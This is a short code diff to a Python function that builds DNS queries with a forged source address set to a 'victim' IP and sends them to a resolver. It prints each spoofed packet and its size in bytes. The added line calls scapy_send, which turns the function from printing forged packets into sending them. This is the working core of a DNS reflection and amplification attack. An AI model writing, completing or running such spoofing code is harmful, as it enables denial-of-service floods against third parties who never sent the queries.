@@ -52,3 +52,4 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
         print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
         if measure:
             print(f"Query size: {len(pkt)} bytes")
+    scapy_send(pkt, verbose=False)
